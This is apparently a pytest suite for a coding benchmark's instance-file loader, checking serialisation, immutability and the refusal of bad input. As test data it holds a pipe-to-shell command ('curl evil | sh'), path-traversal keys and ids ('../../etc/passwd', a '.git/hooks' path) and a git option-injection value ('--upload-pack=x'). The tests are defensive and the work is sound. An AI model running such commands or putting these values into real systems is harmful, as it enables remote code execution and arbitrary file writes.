"""The instance file format: round trip, and everything it must refuse.

The rejections are the substance. A benchmark instance is trusted operator data,
but its path keys become paths on the host filesystem, and an instance that
loads when it should not -- an empty `fail_to_pass`, a `..` in an overlay key --
is either a pass nobody could defend or an arbitrary file write. Each rule has a
test that fails if the rule is removed.
"""

import copy
import json
import os
import pickle
import stat
from pathlib import Path

import pytest

from repolace_shared.instances import (
    SCHEMA_VERSION,
    InstanceError,
    InstanceSpec,
    dump_instance,
    instance_path,
    load_instance,
    load_instance_by_id,
    load_instances,
)


def make_instance(**overrides) -> InstanceSpec:
    fields = {
        "instance_id": "psf__requests-2317",
        "repo": "psf/requests",
        "base_commit": "091991be0da19de9108dbe5e3752917fea3d7fdc",
        "version": "2.4",
        "problem_statement": "method = builtin_str(method) breaks on bytes methods",
        "issue_number": 2317,
        "fail_to_pass": ("test_requests.py::RequestsTestCase::test_HTTP_200_OK_GET_ALTERNATIVE",),
        "pass_to_pass": ("test_requests.py::RequestsTestCase::test_no_content_length",),
        "test_files": {"test_requests.py": "def test_it():\n    assert True\n"},
        "gold_files": {"requests/sessions.py": "# the fix\n"},
        "spec": {"base_image": "python:3.9-slim", "install": ["pip install -e ."]},
    }
    return InstanceSpec(**{**fields, **overrides})


def as_document(spec: InstanceSpec | None = None) -> dict:
    """A valid file's content as a plain dict, for tests to break one key of."""
    spec = spec or make_instance()
    return {
        "instance_id": spec.instance_id,
        "repo": spec.repo,
        "base_commit": spec.base_commit,
        "version": spec.version,
        "problem_statement": spec.problem_statement,
        "issue_number": spec.issue_number,
        "fail_to_pass": list(spec.fail_to_pass),
        "pass_to_pass": list(spec.pass_to_pass),
        "test_files": dict(spec.test_files),
        "gold_files": dict(spec.gold_files),
        "spec": dict(spec.spec),
        "schema_version": SCHEMA_VERSION,
    }


def write_document(path: Path, document: dict) -> Path:
    path.write_text(json.dumps(document), encoding="utf-8")
    return path


@pytest.fixture
def file(tmp_path) -> Path:
    return tmp_path / "psf__requests-2317.json"


class TestRoundTrip:
    def test_a_spec_survives_dump_then_load(self, file):
        spec = make_instance()

        dump_instance(spec, file)

        assert load_instance(file) == spec

    def test_a_targeted_spec_survives_dump_then_load(self, file):
        spec = make_instance(targeted_p2p=True, spec={"test_targets": ["tests/unit"], "install": ["pip install -e ."]})

        dump_instance(spec, file)

        loaded = load_instance(file)
        assert loaded == spec and loaded.targeted_p2p is True

    def test_targeted_p2p_defaults_to_false_when_the_file_omits_it(self, file):
        write_document(file, as_document())

        assert load_instance(file).targeted_p2p is False

    def test_awkward_text_is_preserved_exactly(self, file):
        """Overlay content is compared byte for byte by the run, so the format must
        not normalise line endings, trim, or fold unicode."""
        text = "caf\u00e9 \u2603\r\nsecond line\r\n\ttabbed\n\n"
        spec = make_instance(
            test_files={"tests/test_a.py": text, "tests/empty.py": ""},
            problem_statement="\u2014 a dash and a \"quote\" and a \\ backslash",
        )

        dump_instance(spec, file)

        loaded = load_instance(file)
        assert loaded.test_files["tests/test_a.py"] == text
        assert loaded.test_files["tests/empty.py"] == ""
        assert loaded.problem_statement == spec.problem_statement

    def test_nested_spec_values_survive(self, file):
        spec = make_instance(spec={"extra_env": {"A": "1"}, "install": ["a", "b"], "timeout_seconds": 900})

        dump_instance(spec, file)

        assert load_instance(file).spec == spec.spec

    def test_lists_passed_for_the_tuple_fields_compare_equal_to_tuples(self):
        assert make_instance(fail_to_pass=["a::b"]) == make_instance(fail_to_pass=("a::b",))


class TestOverlayBytes:
    def test_it_is_the_utf8_encoding_of_test_files(self):
        spec = make_instance(test_files={"t/test_a.py": "caf\u00e9\r\n", "t/test_b.py": ""})

        assert spec.overlay_bytes() == {"t/test_a.py": "caf\u00e9\r\n".encode(), "t/test_b.py": b""}

    def test_it_does_not_include_the_gold_files(self):
        spec = make_instance()

        assert set(spec.overlay_bytes()) == set(spec.test_files)
        assert not set(spec.overlay_bytes()) & set(spec.gold_files)

    def test_each_call_is_a_fresh_dict(self):
        spec = make_instance()
        first = spec.overlay_bytes()
        first["smuggled.py"] = b""

        assert "smuggled.py" not in spec.overlay_bytes()


class TestImmutability:
    def test_the_mappings_cannot_be_edited_through_the_spec(self):
        spec = make_instance()

        with pytest.raises(TypeError):
            spec.test_files["tests/test_new.py"] = "x"  # type: ignore[index]
        with pytest.raises(TypeError):
            spec.gold_files["x.py"] = "x"  # type: ignore[index]
        with pytest.raises(TypeError):
            spec.spec["install"] = []  # type: ignore[index]

    def test_editing_the_dict_it_was_built_from_changes_nothing(self):
        files = {"tests/test_a.py": "x"}
        spec = make_instance(test_files=files)

        files["tests/test_smuggled.py"] = "y"

        assert set(spec.test_files) == {"tests/test_a.py"}

    def test_a_nested_list_in_spec_cannot_be_appended_to(self):
        """Only the top level used to be frozen: `spec["install"].append(...)`
        edited the stored spec, which decides how the oracle's tests are run."""
        spec = make_instance(spec={"install": ["pip install -e ."], "extra_env": {"A": "1"}})

        with pytest.raises(AttributeError):
            spec.spec["install"].append("curl evil | sh")  # type: ignore[attr-defined]
        with pytest.raises(TypeError):
            spec.spec["install"][0] = "x"  # type: ignore[index]
        with pytest.raises(TypeError):
            spec.spec["extra_env"]["A"] = "2"  # type: ignore[index]
        assert spec.spec["install"] == ("pip install -e .",)

    def test_editing_a_nested_object_it_was_built_from_changes_nothing(self):
        install = ["pip install -e ."]
        env = {"A": "1"}
        spec = make_instance(spec={"install": install, "extra_env": env})

        install.append("curl evil | sh")
        env["B"] = "2"

        assert spec.spec["install"] == ("pip install -e .",)
        assert dict(spec.spec["extra_env"]) == {"A": "1"}

    def test_deeply_nested_values_are_frozen_too(self):
        spec = make_instance(spec={"a": {"b": [{"c": [1, 2]}]}})

        inner = spec.spec["a"]["b"][0]
        with pytest.raises(TypeError):
            inner["c"] = []  # type: ignore[index]
        assert inner["c"] == (1, 2)

    def test_nesting_beyond_the_bound_is_an_instance_error(self):
        """Not a `RecursionError` from wherever the recursion runs out."""
        value: object = "leaf"
        for _ in range(40):
            value = [value]

        with pytest.raises(InstanceError, match="nested more than"):
            make_instance(spec={"deep": value})

    def test_nesting_just_inside_the_bound_is_accepted(self):
        value: object = "leaf"
        for _ in range(10):
            value = {"k": value}

        assert make_instance(spec={"deep": value}).spec["deep"]["k"]


class TestPlainSpec:
    def test_it_is_a_mutable_json_shaped_copy(self):
        spec = make_instance(spec={"install": ["a", "b"], "extra_env": {"A": "1"}, "timeout_seconds": 900})

        plain = spec.plain_spec()

        assert plain == {"install": ["a", "b"], "extra_env": {"A": "1"}, "timeout_seconds": 900}
        assert type(plain) is dict and type(plain["install"]) is list and type(plain["extra_env"]) is dict
        json.dumps(plain)  # serialises without help

    def test_each_call_is_fresh_and_cannot_reach_the_instance(self):
        spec = make_instance(spec={"install": ["a"], "extra_env": {"A": "1"}})
        first = spec.plain_spec()
        first["install"].append("smuggled")
        first["extra_env"]["B"] = "2"
        first["added"] = True

        assert spec.plain_spec() == {"install": ["a"], "extra_env": {"A": "1"}}
        assert spec.spec["install"] == ("a",)


class TestHashCopyAndPickle:
    """Deep-freezing used to break all three: `MappingProxyType` is unhashable and
    cannot be deep-copied or pickled, which a dict key, an `lru_cache`, a
    deep-copied graph state or a process boundary would each have hit."""

    def test_it_is_hashable_and_equal_specs_hash_alike(self):
        a, b = make_instance(), make_instance()

        assert a == b and hash(a) == hash(b)
        assert {a: 1}[b] == 1
        assert len({a, b}) == 1

    def test_different_instances_are_different_keys(self):
        other = make_instance(instance_id="pallets__flask-4992", issue_number=4992)

        assert len({make_instance(), other}) == 2

    def test_deepcopy_returns_an_equal_and_still_frozen_spec(self):
        spec = make_instance(spec={"install": ["a"], "extra_env": {"A": "1"}})

        copied = copy.deepcopy(spec)

        assert copied == spec and copied is not spec
        assert copied.spec["install"] == ("a",)
        with pytest.raises(TypeError):
            copied.spec["extra_env"]["A"] = "2"  # type: ignore[index]

    def test_a_shallow_copy_works_too(self):
        spec = make_instance()

        assert copy.copy(spec) == spec

    def test_pickle_round_trips(self):
        spec = make_instance(targeted_p2p=True, spec={"test_targets": ["tests"], "extra_env": {"A": "1"}})

        assert pickle.loads(pickle.dumps(spec)) == spec


class TestReprHidesTheOracle:
    def test_neither_the_overlay_nor_the_gold_patch_is_in_the_repr(self):
        """A stray log line must not print the reference fix."""
        spec = make_instance(
            test_files={"tests/test_a.py": "HIDDEN-TEST-BODY"}, gold_files={"src/a.py": "GOLD-FIX-BODY"}
        )

        for text in (repr(spec), str(spec), f"{spec!r}", f"{spec}"):
            assert "GOLD-FIX-BODY" not in text
            assert "HIDDEN-TEST-BODY" not in text

    def test_the_fields_still_compare(self):
        """`repr=False` must not have dropped them from equality."""
        assert make_instance(gold_files={"a.py": "1"}) != make_instance(gold_files={"a.py": "2"})
        assert make_instance(test_files={"a.py": "1"}) != make_instance(test_files={"a.py": "2"})


class TestIssueTitle:
    def title(self, statement: str) -> str:
        return make_instance(problem_statement=statement).issue_title

    def test_it_is_the_first_line(self):
        assert self.title("Fix the parser\n\nIt crashes on empty input.") == "Fix the parser"

    def test_leading_blank_lines_are_skipped(self):
        assert self.title("\n\n   \n  Fix the parser  \nbody") == "Fix the parser"

    def test_crlf_and_cr_line_endings(self):
        assert self.title("Title\r\nbody") == "Title"
        assert self.title("\r\nTitle\rbody") == "Title"

    def test_it_is_at_most_200_characters(self):
        assert len(self.title("x" * 200)) == 200
        assert len(self.title("x" * 201)) == 200
        assert len(self.title("x" * 5000 + "\nsecond")) == 200

    def test_a_cut_title_has_no_trailing_space(self):
        assert self.title("x" * 199 + " tail") == "x" * 199

    def test_a_single_line_statement(self):
        assert self.title("just one line") == "just one line"

    def test_a_statement_with_no_non_blank_line_has_an_empty_title(self):
        assert self.title("  \n\t\n") == ""

    def test_unicode_is_counted_in_characters(self):
        assert self.title("\u00e9" * 300) == "\u00e9" * 200

    def test_it_is_read_only(self):
        with pytest.raises(AttributeError):
            make_instance().issue_title = "x"  # type: ignore[misc]

    def test_it_is_not_a_serialised_field(self, file):
        dump_instance(make_instance(), file)

        assert "issue_title" not in json.loads(file.read_text())


class TestRejections:
    def test_unknown_keys(self, file):
        write_document(file, {**as_document(), "fail_to_pas": ["typo"]})

        with pytest.raises(InstanceError, match="unknown key.*fail_to_pas"):
            load_instance(file)

    def test_missing_keys(self, file):
        document = as_document()
        del document["base_commit"], document["spec"]
        write_document(file, document)

        with pytest.raises(InstanceError, match="missing key.*base_commit.*spec"):
            load_instance(file)

    def test_a_file_with_no_schema_version(self, file):
        """A file with no version cannot be assumed to be this one."""
        document = as_document()
        del document["schema_version"]
        write_document(file, document)

        with pytest.raises(InstanceError, match="schema_version"):
            load_instance(file)

    @pytest.mark.parametrize("version", [SCHEMA_VERSION + 1, 0, "1", 1.0, True, None])
    def test_a_wrong_schema_version(self, file, version):
        write_document(file, {**as_document(), "schema_version": version})

        with pytest.raises(InstanceError, match="schema_version"):
            load_instance(file)

    @pytest.mark.parametrize(
        ("key", "value"),
        [
            ("instance_id", 7),
            ("repo", None),
            ("base_commit", ["abc"]),
            ("version", 2.4),
            ("problem_statement", 12),
            ("issue_number", "2317"),
            ("issue_number", True),
            ("issue_number", 2317.0),
            ("fail_to_pass", "a::b"),
            ("fail_to_pass", ["a::b", 3]),
            ("pass_to_pass", "a::b"),
            ("pass_to_pass", [None]),
            ("test_files", ["a.py"]),
            ("test_files", {"a.py": 3}),
            ("gold_files", {"a.py": None}),
            ("gold_files", "a.py"),
            ("spec", ["base_image"]),
            ("spec", "python:3.9"),
            ("targeted_p2p", "false"),
            ("targeted_p2p", 0),
        ],
    )
    def test_wrong_types(self, file, key, value):
        write_document(file, {**as_document(), key: value})

        with pytest.raises(InstanceError, match=key):
            load_instance(file)

    def test_a_top_level_that_is_not_an_object(self, file):
        file.write_text("[1, 2, 3]")

        with pytest.raises(InstanceError, match="JSON object"):
            load_instance(file)

    def test_invalid_json(self, file):
        file.write_text("{not json")

        with pytest.raises(InstanceError, match="not valid JSON"):
            load_instance(file)

    def test_a_missing_file_is_an_instance_error_not_an_oserror(self, tmp_path):
        with pytest.raises(InstanceError, match="cannot read"):
            load_instance(tmp_path / "nope.json")

    def test_an_empty_fail_to_pass(self, file):
        """`score(expected_fail_to_pass=())` is vacuously PASSED for any patch that
        breaks nothing -- a pass that proves nothing about the issue."""
        write_document(file, {**as_document(), "fail_to_pass": []})

        with pytest.raises(InstanceError, match="fail_to_pass is empty"):
            load_instance(file)

    @pytest.mark.parametrize("instance_id", ["", "../evil", "a/b", "a b", "-leading", ".hidden", "a\nb"])
    def test_an_instance_id_that_is_not_a_safe_name(self, file, instance_id):
        write_document(file, {**as_document(), "instance_id": instance_id})

        with pytest.raises(InstanceError, match="instance_id"):
            load_instance(file)

    @pytest.mark.parametrize("number", [0, -4])
    def test_a_non_positive_issue_number(self, file, number):
        write_document(file, {**as_document(), "issue_number": number})

        with pytest.raises(InstanceError, match="issue_number"):
            load_instance(file)

    def test_text_that_cannot_be_encoded_as_utf8(self, file):
        """A lone surrogate is legal JSON and cannot become the bytes the sandbox gets."""
        file.write_text(
            json.dumps({**as_document(), "test_files": {"tests/test_a.py": "\ud800"}}), encoding="utf-8"
        )

        with pytest.raises(InstanceError, match="UTF-8"):
            load_instance(file)


BAD_PATHS = [
    pytest.param("/etc/cron.d/x", id="absolute"),
    pytest.param("../escape.py", id="leading-dotdot"),
    pytest.param("tests/../../escape.py", id="embedded-dotdot"),
    pytest.param("tests/./test_a.py", id="dot-component"),
    pytest.param(".git/hooks/post-commit", id="git-hook"),
    pytest.param("sub/.git/config", id="nested-git"),
    pytest.param(".GIT/config", id="git-any-case"),
    pytest.param(".git", id="git-itself"),
    pytest.param("tests\\test_a.py", id="backslash"),
    pytest.param("C:\\windows\\x.py", id="windows-path"),
    pytest.param("", id="empty"),
    pytest.param("tests//test_a.py", id="doubled-slash"),
    pytest.param("tests/", id="trailing-slash"),
    pytest.param("tests/test_a.py\x00.txt", id="nul"),
]


@pytest.mark.parametrize("field", ["test_files", "gold_files"])
class TestPathKeys:
    @pytest.mark.parametrize("path", BAD_PATHS)
    def test_a_hostile_key_is_rejected(self, file, field, path):
        write_document(file, {**as_document(), field: {path: "x"}})

        with pytest.raises(InstanceError, match=field):
            load_instance(file)

    def test_one_bad_key_among_good_ones_is_enough(self, file, field):
        write_document(file, {**as_document(), field: {"tests/test_a.py": "ok", "../x.py": "bad"}})

        with pytest.raises(InstanceError, match=field):
            load_instance(file)

    @pytest.mark.parametrize(
        "path",
        [
            "tests/test_a.py",
            "a/b/c/d.py",
            ".github/workflows/ci.yml",
            ".gitattributes",
            ".gitignore",
            "tests/.hidden",
            "pkg/git/util.py",
            "pkg/.gitkeep",
        ],
    )
    def test_ordinary_and_merely_git_flavoured_paths_are_accepted(self, file, field, path):
        """Near-misses on `.git`: the check is on whole components, not substrings."""
        write_document(file, {**as_document(), field: {path: "x"}})

        assert path in getattr(load_instance(file), field)

    def test_dump_refuses_a_hostile_key_and_writes_nothing(self, file, field):
        spec = make_instance(**{field: {"../escape.py": "x"}})

        with pytest.raises(InstanceError, match=field):
            dump_instance(spec, file)

        assert not file.exists()


class TestDump:
    def test_the_output_is_sorted_indented_and_newline_terminated(self, file):
        dump_instance(make_instance(), file)

        text = file.read_text(encoding="utf-8")
        assert text.endswith("}\n") and not text.endswith("\n\n")
        document = json.loads(text)
        assert text == json.dumps(document, indent=2, sort_keys=True, ensure_ascii=False) + "\n"
        assert text.startswith('{\n  "base_commit"')

    def test_key_order_in_the_input_does_not_change_the_bytes(self, tmp_path):
        a = make_instance(test_files={"b.py": "1", "a.py": "2"}, spec={"x": 1, "a": 2})
        b = make_instance(test_files={"a.py": "2", "b.py": "1"}, spec={"a": 2, "x": 1})

        dump_instance(a, tmp_path / "one" / "psf__requests-2317.json")
        dump_instance(b, tmp_path / "two" / "psf__requests-2317.json")

        assert (tmp_path / "one" / "psf__requests-2317.json").read_bytes() == (
            tmp_path / "two" / "psf__requests-2317.json"
        ).read_bytes()

    def test_dumping_twice_is_byte_identical(self, file):
        spec = make_instance()

        dump_instance(spec, file)
        first = file.read_bytes()
        dump_instance(spec, file)

        assert file.read_bytes() == first

    def test_non_ascii_is_written_as_utf8_not_escapes(self, file):
        """Readable diffs: an escaped problem statement is unreviewable."""
        dump_instance(make_instance(problem_statement="caf\u00e9"), file)

        assert "caf\u00e9" in file.read_text(encoding="utf-8")

    def test_it_overwrites_an_existing_file_and_leaves_no_temporary_behind(self, file):
        dump_instance(make_instance(version="1"), file)
        dump_instance(make_instance(version="2"), file)

        assert load_instance(file).version == "2"
        assert [p.name for p in file.parent.iterdir()] == [file.name]

    def test_it_creates_missing_parent_directories(self, tmp_path):
        target = tmp_path / "eval" / "instances" / "psf__requests-2317.json"

        dump_instance(make_instance(), target)

        assert target.is_file()

    def test_it_refuses_a_spec_load_would_refuse_and_writes_nothing(self, file):
        with pytest.raises(InstanceError, match="fail_to_pass is empty"):
            dump_instance(make_instance(fail_to_pass=()), file)
        with pytest.raises(InstanceError, match="schema_version"):
            dump_instance(make_instance(schema_version=SCHEMA_VERSION + 1), file)

        assert not file.exists()

    def test_a_spec_that_json_cannot_hold_is_an_instance_error(self, file):
        with pytest.raises(InstanceError, match="serialisable"):
            dump_instance(make_instance(spec={"bad": object()}), file)

        assert not file.exists()


class TestLoadInstances:
    def test_it_keys_instances_by_id(self, tmp_path):
        a = make_instance()
        b = make_instance(instance_id="pallets__flask-4992", issue_number=4992)
        dump_instance(a, tmp_path / "psf__requests-2317.json")
        dump_instance(b, tmp_path / "pallets__flask-4992.json")

        assert load_instances(tmp_path) == {a.instance_id: a, b.instance_id: b}

    def test_it_skips_everything_that_is_not_a_json_file(self, tmp_path):
        """The directory also holds gold patches, a manifest and a report."""
        dump_instance(make_instance(), tmp_path / "psf__requests-2317.json")
        (tmp_path / "psf__requests-2317.gold.patch").write_text("diff --git a b")
        (tmp_path / "MANIFEST.md").write_text("# manifest")
        (tmp_path / ".DS_Store").write_bytes(b"\x00")
        (tmp_path / "subdir.json").mkdir()

        assert set(load_instances(tmp_path)) == {"psf__requests-2317"}

    def test_an_empty_directory_is_an_empty_set(self, tmp_path):
        assert load_instances(tmp_path) == {}

    def test_a_missing_directory_is_an_error_not_an_empty_set(self, tmp_path):
        """"No instances" and "the wrong path" must not look alike."""
        with pytest.raises(InstanceError, match="not a directory"):
            load_instances(tmp_path / "nowhere")

    def test_the_file_stem_must_equal_the_instance_id(self, tmp_path):
        """Written by hand: `dump_instance` now refuses to produce a misnamed file."""
        write_document(tmp_path / "renamed.json", as_document())

        with pytest.raises(InstanceError, match="psf__requests-2317.json"):
            load_instances(tmp_path)

    def test_two_files_claiming_one_id_are_rejected(self, tmp_path):
        """No separate duplicate check is needed: the second file's stem cannot
        match, so the stem rule is what refuses it."""
        dump_instance(make_instance(), tmp_path / "psf__requests-2317.json")
        write_document(tmp_path / "psf__requests-2317-copy.json", as_document())

        with pytest.raises(InstanceError, match="psf__requests-2317.json"):
            load_instances(tmp_path)

    def test_a_json_file_that_is_not_an_instance_fails_the_load(self, tmp_path):
        """Skipped silently, an instance that failed to parse would vanish from the set."""
        dump_instance(make_instance(), tmp_path / "psf__requests-2317.json")
        (tmp_path / "notes.json").write_text('{"hello": "world"}')

        with pytest.raises(InstanceError, match="notes.json"):
            load_instances(tmp_path)


class TestBaseCommit:
    @pytest.mark.parametrize(
        "commit",
        ["main", "HEAD", "v2.4", "--upload-pack=x", "-x", "091991be", "0" * 39, "0" * 41, "A" * 40, "g" * 40, "", " " * 40],
    )
    def test_anything_but_a_full_lowercase_sha_is_refused(self, file, commit):
        """A branch or tag pins the instance to a moving ref, and `--upload-pack=x`
        would reach git's argv as an option."""
        write_document(file, {**as_document(), "base_commit": commit})

        with pytest.raises(InstanceError, match="base_commit"):
            load_instance(file)

    def test_a_full_sha_is_accepted(self, file):
        write_document(file, {**as_document(), "base_commit": "0123456789abcdef" * 2 + "01234567"})

        assert load_instance(file).base_commit == "0123456789abcdef" * 2 + "01234567"

    def test_dump_refuses_it_too_and_writes_nothing(self, file):
        with pytest.raises(InstanceError, match="base_commit"):
            dump_instance(make_instance(base_commit="main"), file)

        assert not file.exists()


class TestIssueNumberBounds:
    @pytest.mark.parametrize("number", [1, 2317, 2**31 - 1])
    def test_a_32_bit_positive_number_is_accepted(self, file, number):
        write_document(file, {**as_document(), "issue_number": number})

        assert load_instance(file).issue_number == number

    @pytest.mark.parametrize("number", [0, -1, 2**31, 2**63, 2**70])
    def test_anything_else_is_refused_at_load_not_at_enqueue(self, file, number):
        """`tasks.issue_number` is a 32-bit column; a larger value used to load and
        fail with a driver overflow far from where it was written."""
        write_document(file, {**as_document(), "issue_number": number})

        with pytest.raises(InstanceError, match="issue_number"):
            load_instance(file)

    def test_dump_refuses_an_overflowing_number(self, file):
        with pytest.raises(InstanceError, match="issue_number"):
            dump_instance(make_instance(issue_number=2**31), file)


class TestTestIdLists:
    @pytest.mark.parametrize("field", ["fail_to_pass", "pass_to_pass"])
    def test_a_bare_string_is_refused_not_split_into_characters(self, field):
        """`tuple("a::b")` is four one-character ids that no suite can match."""
        with pytest.raises(InstanceError, match=f"{field} must be a list or tuple"):
            make_instance(**{field: "tests/x.py::t"})

    @pytest.mark.parametrize("field", ["fail_to_pass", "pass_to_pass"])
    @pytest.mark.parametrize("bad", [None, 7, b"x", {"a": 1}])
    def test_any_other_non_sequence_is_refused(self, field, bad):
        with pytest.raises(InstanceError, match=field):
            make_instance(**{field: bad})

    @pytest.mark.parametrize("field", ["fail_to_pass", "pass_to_pass"])
    @pytest.mark.parametrize("entries", [[""], ["a::b", ""], ["  "], ["\t\n"], [3], [None]])
    def test_empty_or_non_string_entries_are_refused_on_load(self, file, field, entries):
        write_document(file, {**as_document(), field: entries})

        with pytest.raises(InstanceError, match=field):
            load_instance(file)

    @pytest.mark.parametrize("field", ["fail_to_pass", "pass_to_pass"])
    def test_and_on_dump(self, file, field):
        with pytest.raises(InstanceError, match=field):
            dump_instance(make_instance(**{field: ("a::b", "")}), file)

        assert not file.exists()

    def test_an_empty_pass_to_pass_is_fine(self, file):
        """It is reference only; an instance with no passing tests to protect is valid."""
        write_document(file, {**as_document(), "pass_to_pass": []})

        assert load_instance(file).pass_to_pass == ()

    def test_a_list_for_a_tuple_field_is_still_accepted(self):
        assert make_instance(fail_to_pass=["a::b", "c::d"]).fail_to_pass == ("a::b", "c::d")


class TestTestFilesRequired:
    def test_an_empty_overlay_is_refused_on_load(self, file):
        """Its keys are `hidden_paths`; an empty set there silently turns the
        feedback filter and the stdout suppression off."""
        write_document(file, {**as_document(), "test_files": {}})

        with pytest.raises(InstanceError, match="test_files is empty"):
            load_instance(file)

    def test_and_on_dump(self, file):
        with pytest.raises(InstanceError, match="test_files is empty"):
            dump_instance(make_instance(test_files={}), file)

        assert not file.exists()

    def test_an_empty_gold_is_not_refused_here(self, file):
        """A different question: gold validation is what needs `gold_files`, and
        this module does not decide when that runs."""
        write_document(file, {**as_document(), "gold_files": {}})

        assert load_instance(file).gold_files == {}


class TestTargetedP2P:
    TARGETS = {"test_targets": ["tests/unit"]}

    def test_flagged_with_targets_is_consistent(self, file):
        write_document(file, {**as_document(), "spec": self.TARGETS, "targeted_p2p": True})

        assert load_instance(file).targeted_p2p is True

    def test_unflagged_without_targets_is_consistent(self, file):
        write_document(file, {**as_document(), "targeted_p2p": False})

        assert load_instance(file).targeted_p2p is False

    def test_flagged_with_no_targets_is_refused(self, file):
        """"Targeted" with nothing targeted: a result flagged as narrower than it was."""
        write_document(file, {**as_document(), "targeted_p2p": True})

        with pytest.raises(InstanceError, match="targeted_p2p is True but spec.test_targets is empty"):
            load_instance(file)

    def test_targets_without_the_flag_are_refused(self, file):
        """A narrowed run reported as the full one -- the quiet case, and the worse."""
        write_document(file, {**as_document(), "spec": self.TARGETS, "targeted_p2p": False})

        with pytest.raises(InstanceError, match="targeted_p2p is False but spec.test_targets is set"):
            load_instance(file)

    def test_targets_with_the_flag_omitted_are_refused(self, file):
        """The flag defaults to false, so omitting it is the same mistake."""
        write_document(file, {**as_document(), "spec": self.TARGETS})

        with pytest.raises(InstanceError, match="targeted_p2p"):
            load_instance(file)

    def test_an_empty_target_list_counts_as_no_targets(self, file):
        write_document(file, {**as_document(), "spec": {"test_targets": []}, "targeted_p2p": False})

        assert load_instance(file).targeted_p2p is False

    def test_dump_refuses_a_mismatch(self, file):
        with pytest.raises(InstanceError, match="targeted_p2p"):
            dump_instance(make_instance(targeted_p2p=True), file)


class TestInstanceIdIsGitRefSafe:
    """The id becomes `bench/<id>` (a branch) and `bench-<id>` (a repository), and
    the character class alone lets through names git and GitHub refuse."""

    @pytest.mark.parametrize(
        "instance_id",
        ["a..b", "x.", "x.lock", "x.LOCK", "x.Lock", "x.git", "x.GIT", "a...b", "..", "a.-.lock", "x..lock"],
    )
    def test_a_ref_unsafe_id_is_refused(self, file, instance_id):
        write_document(file, {**as_document(), "instance_id": instance_id})

        with pytest.raises(InstanceError, match="instance_id"):
            load_instance(file)

    @pytest.mark.parametrize(
        "instance_id",
        [
            "psf__requests-2317",
            "scikit-learn__scikit-learn-10297",
            "a.b",
            "a.b.c-1",
            "x.locked",
            "x.gitx",
            "lock",
            "git",
            "1",
            "A_b-c.d",
        ],
    )
    def test_an_ordinary_id_is_accepted(self, tmp_path, instance_id):
        write_document(tmp_path / f"{instance_id}.json", {**as_document(), "instance_id": instance_id})

        assert load_instance(tmp_path / f"{instance_id}.json").instance_id == instance_id

    @pytest.mark.parametrize("instance_id", ["a..b", "x.", "x.lock", "x.git"])
    def test_dump_refuses_them_too(self, tmp_path, instance_id):
        with pytest.raises(InstanceError, match="instance_id"):
            dump_instance(make_instance(instance_id=instance_id), tmp_path / f"{instance_id}.json")

    @pytest.mark.parametrize("instance_id", ["a..b", "x.", "x.lock"])
    def test_git_itself_agrees_these_are_not_branch_names(self, tmp_path, instance_id):
        """The premise, checked against the real thing rather than asserted.

        Not every refusal is git's: `.git` is GitHub stripping it from a repository
        name, and `.LOCK` is *accepted* by git (its `.lock` rule is case-sensitive)
        but refused here anyway, because on a case-insensitive checkout it would
        collide with a lock file.
        """
        import subprocess

        result = subprocess.run(
            ["git", "check-ref-format", "--branch", f"bench/{instance_id}"],
            capture_output=True,
            cwd=tmp_path,
            check=False,
        )

        assert result.returncode != 0


class TestInstancePath:
    def test_it_is_the_resolved_file_inside_the_directory(self, tmp_path):
        assert instance_path(tmp_path, "psf__requests-2317") == tmp_path.resolve() / "psf__requests-2317.json"

    def test_a_string_directory_works(self, tmp_path):
        assert instance_path(str(tmp_path), "a").parent == tmp_path.resolve()  # type: ignore[arg-type]

    @pytest.mark.parametrize(
        "instance_id",
        ["../../etc/passwd", "../x", "a/b", "/etc/passwd", "a\\b", "", ".", "..", ".hidden", "-x", "a\x00b", "a b"],
    )
    def test_a_hostile_id_from_a_database_row_is_refused(self, tmp_path, instance_id):
        """The reason it exists: `directory / f"{id}.json"` built by hand follows
        `..` and an absolute path anywhere on the host."""
        with pytest.raises(InstanceError, match="instance_id"):
            instance_path(tmp_path, instance_id)

    @pytest.mark.parametrize("instance_id", [None, 7, b"abc", ["a"]])
    def test_a_non_string_id_is_an_instance_error_not_a_type_error(self, tmp_path, instance_id):
        """`tasks.instance_id` is nullable; a NULL must not surface as a TypeError."""
        with pytest.raises(InstanceError, match="instance_id"):
            instance_path(tmp_path, instance_id)  # type: ignore[arg-type]

    @pytest.mark.parametrize("instance_id", ["a..b", "x.lock", "x."])
    def test_it_applies_the_same_ref_rules_as_the_files(self, tmp_path, instance_id):
        with pytest.raises(InstanceError):
            instance_path(tmp_path, instance_id)

    def test_a_symlinked_instance_file_is_refused_not_followed(self, tmp_path):
        """CLAUDE.md: a symlink is refused rather than followed. A `x.json` pointing at
        any other readable JSON file would otherwise load as instance `x`."""
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        write_document(elsewhere / "target.json", as_document())
        directory = tmp_path / "instances"
        directory.mkdir()
        os.symlink(elsewhere / "target.json", directory / "psf__requests-2317.json")

        with pytest.raises(InstanceError, match="symlink"):
            instance_path(directory, "psf__requests-2317")

    def test_a_missing_file_is_not_the_paths_concern(self, tmp_path):
        """It returns where the file would be; `load_instance` reports it missing."""
        assert not instance_path(tmp_path, "nope").exists()


class TestLoadInstanceById:
    def test_it_loads_the_named_instance(self, tmp_path):
        spec = make_instance()
        dump_instance(spec, tmp_path / "psf__requests-2317.json")

        assert load_instance_by_id(tmp_path, "psf__requests-2317") == spec

    def test_a_missing_instance_is_an_instance_error(self, tmp_path):
        with pytest.raises(InstanceError, match="cannot read"):
            load_instance_by_id(tmp_path, "psf__requests-2317")

    def test_a_hostile_id_is_refused_before_anything_is_read(self, tmp_path):
        outside = tmp_path / "outside.json"
        write_document(outside, as_document())
        directory = tmp_path / "instances"
        directory.mkdir()

        with pytest.raises(InstanceError, match="instance_id"):
            load_instance_by_id(directory, "../outside")

    def test_a_file_that_claims_another_id_is_refused(self, tmp_path):
        """As `load_instances` requires of the stem: content and name must agree."""
        write_document(tmp_path / "pallets__flask-4992.json", as_document())

        with pytest.raises(InstanceError, match="contains instance 'psf__requests-2317'"):
            load_instance_by_id(tmp_path, "pallets__flask-4992")

    def test_a_symlinked_file_is_refused(self, tmp_path):
        write_document(tmp_path / "real.json", as_document())
        os.symlink(tmp_path / "real.json", tmp_path / "psf__requests-2317.json")

        with pytest.raises(InstanceError, match="symlink"):
            load_instance_by_id(tmp_path, "psf__requests-2317")

    def test_an_invalid_file_is_an_instance_error_naming_it(self, tmp_path):
        (tmp_path / "psf__requests-2317.json").write_text("{nope")

        with pytest.raises(InstanceError, match="psf__requests-2317.json"):
            load_instance_by_id(tmp_path, "psf__requests-2317")


class TestDumpHardening:
